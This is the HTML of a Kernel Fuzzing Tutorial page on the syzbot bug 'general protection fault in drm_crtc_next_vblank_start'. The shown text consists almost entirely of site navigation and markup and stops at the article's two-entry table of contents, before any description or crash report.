

<!DOCTYPE html>


<html lang="en" >

  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />

    <title>general protection fault in drm_crtc_next_vblank_start &#8212; Kernel Fuzzing Tutorial  documentation</title>
  
  
  
  <script data-cfasync="false">
    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
    document.documentElement.dataset.theme = localStorage.getItem("theme") || "light";
  </script>
  
  <!-- Loaded before other Sphinx assets -->
  <link href="../../../../../_static/styles/theme.css?digest=e353d410970836974a52" rel="stylesheet" />
<link href="../../../../../_static/styles/bootstrap.css?digest=e353d410970836974a52" rel="stylesheet" />
<link href="../../../../../_static/styles/pydata-sphinx-theme.css?digest=e353d410970836974a52" rel="stylesheet" />

  
  <link href="../../../../../_static/vendor/fontawesome/6.1.2/css/all.min.css?digest=e353d410970836974a52" rel="stylesheet" />
  <link rel="preload" as="font" type="font/woff2" crossorigin href="../../../../../_static/vendor/fontawesome/6.1.2/webfonts/fa-solid-900.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="../../../../../_static/vendor/fontawesome/6.1.2/webfonts/fa-brands-400.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="../../../../../_static/vendor/fontawesome/6.1.2/webfonts/fa-regular-400.woff2" />

    <link rel="stylesheet" type="text/css" href="../../../../../_static/pygments.css" />
    <link rel="stylesheet" href="../../../../../_static/styles/sphinx-book-theme.css?digest=14f4ca6b54d191a8c7657f6c759bf11a5fb86285" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../../../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../../_static/css/custom.css" />
    <link rel="stylesheet" type="text/css" href="../../../../../_static/design-style.1e8bd061cd6da7fc9cf755528e8ffc24.min.css" />
  
  <!-- Pre-loaded scripts that we'll load fully later -->
  <link rel="preload" as="script" href="../../../../../_static/scripts/bootstrap.js?digest=e353d410970836974a52" />
<link rel="preload" as="script" href="../../../../../_static/scripts/pydata-sphinx-theme.js?digest=e353d410970836974a52" />

    <script data-url_root="../../../../../" id="documentation_options" src="../../../../../_static/documentation_options.js"></script>
    <script src="../../../../../_static/jquery.js"></script>
    <script src="../../../../../_static/underscore.js"></script>
    <script src="../../../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
    <script src="../../../../../_static/doctools.js"></script>
    <script src="../../../../../_static/sphinx_highlight.js"></script>
    <script src="../../../../../_static/clipboard.min.js"></script>
    <script src="../../../../../_static/copybutton.js"></script>
    <script src="../../../../../_static/scripts/sphinx-book-theme.js?digest=5a5c038af52cf7bc1a1ec88eea08e6366ee68824"></script>
    <script src="../../../../../_static/design-tabs.js"></script>
    <script>DOCUMENTATION_OPTIONS.pagename = 'kernel/linux/bugs/syzbot/gpf_drm_crtc_next_vblank_start/gpf_drm_crtc_next_vblank_start';</script>
    <link rel="canonical" href="https://nix.dev/kernel/linux/bugs/syzbot/gpf_drm_crtc_next_vblank_start/gpf_drm_crtc_next_vblank_start.html" />
    <link rel="shortcut icon" href="../../../../../_static/favicon.png"/>
    <link rel="index" title="Index" href="../../../../../genindex.html" />
    <link rel="search" title="Search" href="../../../../../search.html" />
    <link rel="next" title="KASAN: use-after-free Read in netdev_unregister_kobject" href="../uaf_netdev_unregister_kobject/uaf_netdev_unregister_kobject.html" />
    <link rel="prev" title="CVE-2024-43894" href="../../cve/CVE-2024-43894/CVE-2024-43894.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="docsearch:language" content="en"/>
  </head>
  
  
  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">

  
  
  <a class="skip-link" href="#main-content">Skip to main content</a>
  
  <input type="checkbox"
          class="sidebar-toggle"
          name="__primary"
          id="__primary"/>
  <label class="overlay overlay-primary" for="__primary"></label>
  
  <input type="checkbox"
          class="sidebar-toggle"
          name="__secondary"
          id="__secondary"/>
  <label class="overlay overlay-secondary" for="__secondary"></label>
  
  <div class="search-button__wrapper">
    <div class="search-button__overlay"></div>
    <div class="search-button__search-container">
<form class="bd-search d-flex align-items-center"
      action="../../../../../search.html"
      method="get">
  <i class="fa-solid fa-magnifying-glass"></i>
  <input type="search"
         class="form-control"
         name="q"
         id="search-input"
         placeholder="Search..."
         aria-label="Search..."
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"/>
  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
</form></div>
  </div>
  
    <nav class="bd-header navbar navbar-expand-lg bd-navbar">
    </nav>
  
  <div class="bd-container">
    <div class="bd-container__inner bd-page-width">
      
      <div class="bd-sidebar-primary bd-sidebar">
        

  
  <div class="sidebar-header-items sidebar-primary__section">
    
    
    
    
  </div>
  
    <div class="sidebar-primary-items__start sidebar-primary__section">
        <div class="sidebar-primary-item"><div class="logo">
  <a href="/">
    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
      <img src="/_static/img/linux.svg" alt="">
      <span>Kernel Fuzzing</span>
      <span>V0.11.0</span>
    </div>
  </a>
</div>

<iframe
  src="https://ghbtns.com/github-btn.html?user=Killuayz&repo=Kernel-Fuzzing-Tutorial&type=star&count=true&size=large"
  frameborder="0" scrolling="0" width="170" height="30" title="GitHub"></iframe>

<p>Notes about Kernel Fuzzing</p></div>
        <div class="sidebar-primary-item">
<form class="bd-search d-flex align-items-center"
      action="../../../../../search.html"
      method="get">
  <i class="fa-solid fa-magnifying-glass"></i>
  <input type="search"
         class="form-control"
         name="q"
         id="search-input"
         placeholder="Search..."
         aria-label="Search..."
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"/>
  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
</form></div>
        <div class="sidebar-primary-item"><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item navbar-nav active">
        <ul class="current nav bd-sidenav">
<li class="toctree-l1 current active has-children"><a class="reference internal" href="../../../../index.html">Kernel</a><input checked class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-1"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
<li class="toctree-l2 current active has-children"><a class="reference internal" href="../../../index.html">Linux Kernel</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-2"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../tutorial/index.html">Linux Kernel Tutorial</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-3"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/compile_run/compile_run.html">Linux 内核的编译与运行</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/build_image/build_image.html">如何制作简单的Linux系统镜像</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/debug/debug_kernel.html">Linux内核调试</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/simple_driver/simple_driver.html">简单的驱动程序：VirtualDisk字符设备驱动</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/load_module/linux_kernel_load_module.html">如何让Linux内核编译驱动模块并且加载驱动模块</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/udev/udev.html">Linux的设备管理器——udev</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/sysfs/sysfs.html">Sysfs介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/ebpf/ebpf.html">eBPF</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/ioctl/ioctl.html">系统调用ioctl介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/device_driver_arch/device_driver_arch.html">Linux设备驱动框架</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/xarray/xarray.html">基础数据结构介绍——XArray</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../tutorial/globalmem_driver/globalmem_driver.html">globalmem 虚拟设备</a></li>
</ul>
</li>
<li class="toctree-l3 current active has-children"><a class="reference internal" href="../../index.html">Linux Kernel Bugs</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-4"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../../cve/CVE-2024-50274/CVE-2024-50274.html">CVE-2024-50274</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../cve/CVE-2024-43894/CVE-2024-43894.html">CVE-2024-43894</a></li>
<li class="toctree-l4 current active"><a class="current reference internal" href="#">general protection fault in drm_crtc_next_vblank_start</a></li>
<li class="toctree-l4"><a class="reference internal" href="../uaf_netdev_unregister_kobject/uaf_netdev_unregister_kobject.html">KASAN: use-after-free Read in netdev_unregister_kobject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../npd_read_ida_free/npd_read_ida_free.html">KASAN: null-ptr-deref Read in ida_free (4)</a></li>
<li class="toctree-l4"><a class="reference internal" href="../gpf_hci_abort_conn/gpf_hci_abort_conn.html">general protection fault in hci_abort_conn</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../../fuzzer/index.html">Fuzzer</a><input checked class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-5"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../fuzzer/syzkaller/index.html">SyzKaller</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-6"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../fuzzer/syzkaller/0-introduction/0-introduction.html">Syzkaller 介绍</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../../simulator/index.html">Simulator</a><input checked class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-7"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../simulator/qemu/index.html">QEMU</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-8"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../simulator/qemu/0-how-to-use-kvm/0-how-to-use-kvm.html">如何使用KVM运行系统</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../simulator/qemu/1-how-to-share-directory/1-how-to-share-directory.html">如何在HOST和GUEST之间建立共享目录</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../simulator/qemu/2-how-to-connect-net/2-how-to-connect-net.html">QEMU中如何配置网络</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../simulator/qemu/3-run-macos-on-kvm/3-run-macos-on-kvm.html">如何使用QEMU/KVM运行MacOS</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../simulator/qemu/4-how-to-load-custom-firmware/4-how-to-load-custom-firmware.html">在QEMU中加载自定义固件（firmware）失败</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../../paper/index.html">Paper</a><input checked class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-9"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../../paper/paper.html">Papers About Kernel Fuzzing</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../../nix/index.html">Nix</a><input checked class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-10"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../../nix/install-nix.html">Install Nix</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/tutorials/index.html">Tutorials</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-11"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/tutorials/first-steps/index.html">First steps</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-12"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/first-steps/ad-hoc-shell-environments.html">Ad hoc shell environments</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/first-steps/reproducible-scripts.html">Reproducible interpreted scripts</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/first-steps/declarative-shell.html">Declarative shell environments</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/first-steps/towards-reproducibility-pinning-nixpkgs.html">Towards reproducibility: pinning Nixpkgs</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/tutorials/nix-language.html">Nix language basics</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/tutorials/packaging-existing-software.html">Packaging existing software</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/tutorials/callpackage.html">Package parameters and overrides with <code class="docutils literal notranslate"><span class="pre">callPackage</span></code></a></li>

<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/tutorials/working-with-local-files.html">Working with local files</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/tutorials/cross-compilation.html">Cross compilation</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/tutorials/module-system/index.html">Module system</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-13"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/module-system/a-basic-module/index.html">1. A basic module</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/module-system/deep-dive.html">2. Module system deep dive</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/tutorials/nixos/index.html">NixOS</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-14"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/nixos-configuration-on-vm.html">NixOS virtual machines</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/building-bootable-iso-image.html">Building a bootable ISO image</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/building-and-running-docker-images.html">Building and running Docker images</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/integration-testing-using-virtual-machines.html">Integration testing with NixOS virtual machines</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/provisioning-remote-machines.html">Provisioning remote machines via SSH</a></li>

<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/installing-nixos-on-a-raspberry-pi.html">Installing NixOS on a Raspberry Pi</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/deploying-nixos-using-terraform.html">Deploying NixOS using Terraform</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/binary-cache-setup.html">Setting up an HTTP binary cache</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/tutorials/nixos/distributed-builds-setup.html">Setting up distributed builds</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/guides/index.html">Guides</a><input class="toctree-checkbox" id="toctree-checkbox-15" name="toctree-checkbox-15" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-15"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/guides/recipes/index.html">Recipes</a><input class="toctree-checkbox" id="toctree-checkbox-16" name="toctree-checkbox-16" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-16"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/add-binary-cache.html">Configure Nix to use a custom binary cache</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/direnv.html">Automatic environments</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/sharing-dependencies.html">Dependencies in the development shell</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/dependency-management.html">Managing remote sources</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/python-environment.html">Python development environment</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/post-build-hook.html">Setting up post-build hooks</a></li>






<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/guides/recipes/continuous-integration-github-actions.html">Continuous integration with GitHub Actions</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/guides/best-practices.html">Best practices</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/guides/troubleshooting.html">Troubleshooting</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/guides/faq.html">Frequently Asked Questions</a></li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/reference/index.html">Reference</a><input class="toctree-checkbox" id="toctree-checkbox-17" name="toctree-checkbox-17" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-17"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/reference/glossary.html">Glossary</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/reference/nix-manual.html">Nix reference manual</a><input class="toctree-checkbox" id="toctree-checkbox-18" name="toctree-checkbox-18" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-18"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference external" href="https://nix.dev/manual/nix/development/">Nix pre-release (development)</a></li>
<li class="toctree-l4"><a class="reference external" href="https://nix.dev/manual/nix/latest/">Nix @nix-latest@ (latest)</a></li>
<li class="toctree-l4"><a class="reference external" href="https://nix.dev/manual/nix/rolling/">Nix @nix-rolling@ (in Nixpkgs rolling)</a></li>
<li class="toctree-l4"><a class="reference external" href="https://nix.dev/manual/nix/stable/">Nix @nix-stable@ (in Nixpkgs @nixpkgs-stable@)</a></li>
<li class="toctree-l4"><a class="reference external" href="https://nix.dev/manual/nix/prev-stable/">Nix @nix-prev-stable@ (in Nixpkgs @nixpkgs-prev-stable@)</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference external" href="https://nixos.org/manual/nixpkgs/stable/">Nixpkgs manual</a></li>
<li class="toctree-l3"><a class="reference external" href="https://nixos.org/manual/nixos/stable/">NixOS manual</a></li>
<li class="toctree-l3"><a class="reference external" href="https://github.com/nix-community/">Community projects</a></li>
<li class="toctree-l3"><a class="reference external" href="https://github.com/nix-community/awesome-nix">Support tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/recommended-reading.html">Further reading</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/reference/pinning-nixpkgs.html">Pinning Nixpkgs</a></li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/concepts/index.html">Concepts</a><input class="toctree-checkbox" id="toctree-checkbox-19" name="toctree-checkbox-19" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-19"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/concepts/flakes.html">Flakes</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/concepts/faq.html">Frequently Asked Questions</a></li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/flakes/index.html">Flakes</a><input class="toctree-checkbox" id="toctree-checkbox-20" name="toctree-checkbox-20" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-20"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/flakes/flake_intro.html">Introduction to Flakes</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/flakes/flake_getting_start.html">Getting Start</a></li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/contributing/index.html">Contributing</a><input class="toctree-checkbox" id="toctree-checkbox-21" name="toctree-checkbox-21" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-21"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/contributing/how-to-contribute.html">How to contribute</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/contributing/how-to-get-help.html">How to get help</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../../../nix/contributing/documentation/index.html">Contributing documentation</a><input class="toctree-checkbox" id="toctree-checkbox-22" name="toctree-checkbox-22" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-22"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/contributing/documentation/resources.html">Documentation resources</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/contributing/documentation/diataxis.html">Documentation framework</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/contributing/documentation/style-guide.html">Style guide</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../nix/contributing/documentation/writing-a-tutorial.html">How to write a tutorial</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../../nix/acknowledgments/index.html">Acknowledgements</a><input class="toctree-checkbox" id="toctree-checkbox-23" name="toctree-checkbox-23" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-23"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../nix/acknowledgments/sponsors.html">Sponsors</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../../wiki/index.html">Wiki</a><input checked class="toctree-checkbox" id="toctree-checkbox-24" name="toctree-checkbox-24" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-24"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/0-drm/drm.html">DRM介绍</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/1-nix_with_glibc_compile_error/nix_with_glibc_compile_error.html">Nix打包项目时遇到Cannot find stdlib.h</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/2-nix_golang_get_proxy_connection_refused/nix_golang_get_proxy_connection_refused.html">使用Nix打包Golang项目时报出错误<code class="docutils literal notranslate"><span class="pre">Connection</span> <span class="pre">Refused</span></code></a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/3-perf_event_open/perf_event_open.html">perf_event_open 函数介绍</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/4-compile_v4.x_undefined_ilog2_NaN/compile_v4.x_undefined_ilog2_NaN.html">在编译linux内核v4.x错误undefined reference to `____ilog2_NaN’</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/5-compile_linux_modules/compile_linux_modules.html">如何编译Linux的全部模块</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/6-specific_keyring_file_not_found/specific_keyring_file_not_found.html">编译时遇到specified keyring file xxx not found</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/7-cannot_insert_hardware_breakpoint/cannot_insert_hardware_breakpoint.html">Cannot insert hardware breakpoint 11:Remote failure reply: 22.</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../wiki/8-employ-own-overleaf/employ_own_overleaf.html">部署自己的Overleaf</a></li>
</ul>
</li>
</ul>

    </div>
</nav></div>
    </div>
  
  
  <div class="sidebar-primary-items__end sidebar-primary__section">
  </div>
  
  <div id="rtd-footer-container"></div>


      </div>
      
      <main id="main-content" class="bd-main">
        
        

<div class="sbt-scroll-pixel-helper"></div>

          <div class="bd-content">
            <div class="bd-article-container">
              
              <div class="bd-header-article">
<div class="header-article-items header-article__inner">
  
    <div class="header-article-items__start">
      
        <div class="header-article-item"><label class="sidebar-toggle primary-toggle btn btn-sm" for="__primary" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
  <span class="fa-solid fa-bars"></span>
</label></div>
      
    </div>
  
  
    <div class="header-article-items__end">
      
        <div class="header-article-item">

<div class="article-header-buttons">





<div class="dropdown dropdown-source-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Source repositories">
    <i class="fab fa-github"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="https://github.com/KilluaYZ/Kernel-Fuzzing-Tutorial" target="_blank"
   class="btn btn-sm btn-source-repository-button dropdown-item"
   title="Source repository"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fab fa-github"></i>
  </span>
<span class="btn__text-container">Repository</span>
</a>
</li>
      
      
      
      
      <li><a href="https://github.com/KilluaYZ/Kernel-Fuzzing-Tutorial/issues/new?title=Issue%20on%20page%20%2Fkernel/linux/bugs/syzbot/gpf_drm_crtc_next_vblank_start/gpf_drm_crtc_next_vblank_start.html&body=Your%20issue%20content%20here." target="_blank"
   class="btn btn-sm btn-source-issues-button dropdown-item"
   title="Open an issue"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-lightbulb"></i>
  </span>
<span class="btn__text-container">Open issue</span>
</a>
</li>
      
  </ul>
</div>






<div class="dropdown dropdown-download-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
    <i class="fas fa-download"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="../../../../../_sources/kernel/linux/bugs/syzbot/gpf_drm_crtc_next_vblank_start/gpf_drm_crtc_next_vblank_start.md" target="_blank"
   class="btn btn-sm btn-download-source-button dropdown-item"
   title="Download source file"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file"></i>
  </span>
<span class="btn__text-container">.md</span>
</a>
</li>
      
      
      
      
      <li>
<button onclick="window.print()"
  class="btn btn-sm btn-download-pdf-button dropdown-item"
  title="Print to PDF"
  data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file-pdf"></i>
  </span>
<span class="btn__text-container">.pdf</span>
</button>
</li>
      
  </ul>
</div>




<button onclick="toggleFullScreen()"
  class="btn btn-sm btn-fullscreen-button"
  title="Fullscreen mode"
  data-bs-placement="bottom" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-expand"></i>
  </span>

</button>


<script>
document.write(`
  <button class="theme-switch-button btn btn-sm btn-outline-primary navbar-btn rounded-circle" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="theme-switch" data-mode="light"><i class="fa-solid fa-sun"></i></span>
    <span class="theme-switch" data-mode="dark"><i class="fa-solid fa-moon"></i></span>
    <span class="theme-switch" data-mode="auto"><i class="fa-solid fa-circle-half-stroke"></i></span>
  </button>
`);
</script>

<script>
document.write(`
  <button class="btn btn-sm navbar-btn search-button search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="fa-solid fa-magnifying-glass"></i>
  </button>
`);
</script>
<label class="sidebar-toggle secondary-toggle btn btn-sm" for="__secondary"title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="fa-solid fa-list"></span>
</label>
</div></div>
      
    </div>
  
</div>
</div>
              
              

<div id="jb-print-docs-body" class="onlyprint">
    <h1>general protection fault in drm_crtc_next_vblank_start</h1>
    <!-- Table of contents -->
    <div id="print-main-content">
        <div id="jb-print-toc">
            
            <div>
                <h2> Contents </h2>
            </div>
            <nav aria-label="Page">
                <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">漏洞描述</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">崩溃报告</a></li>
